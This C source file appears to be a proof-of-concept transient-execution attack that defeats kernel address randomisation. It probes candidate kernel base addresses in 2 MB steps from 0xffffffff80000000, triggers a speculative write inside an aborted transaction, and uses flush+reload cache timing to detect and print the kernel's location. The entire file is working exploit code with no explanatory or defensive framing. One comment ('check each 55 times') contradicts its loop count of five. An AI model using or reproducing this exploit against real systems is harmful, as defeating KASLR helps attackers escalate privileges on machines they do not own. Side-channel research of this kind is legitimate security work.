#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>

#include "cacheutils.h"
#define KERNEL_SIZE 1024 // in MB
#define ALIGNMENT 2 // in MB

int main(int argc, char **argv) {
  char mem[4096 * 256];
  memset(mem, 1, sizeof(mem));

  // Detect the cache miss threshold
  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss @ %zd\n", CACHE_MISS);

  // Prepare memory for flush+reload
  int i;
  for (i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  //try all possible locations for kernel base address, 2MB increments
  int k;
  volatile char *buffer = (volatile char *)0xffffffff80000000ull;
  for (k = 0; k < KERNEL_SIZE/ALIGNMENT; k++) {
    //check each 55 times
    int r;
    for (r = 0; r < 5; r++) {
      if (try_start()) {
        // trigger transient execution
        maccess(0);
        *buffer = 'X';
        // improves accuracy of the attack
        asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n");
        maccess(mem + *buffer * 4096);

        try_abort();
      }
      try_end();

      // check whether data was cached, if it is we found the kernel
      if (flush_reload(mem + 'X' * 4096)) {
        printf("%p\n", buffer);
        fflush(stdout);
        goto next;
      }
    }

  next:
    // 2 MB increments
    buffer += 2 * 1024 * 1024;
    fflush(stdout);
  }

  return EXIT_SUCCESS;
}
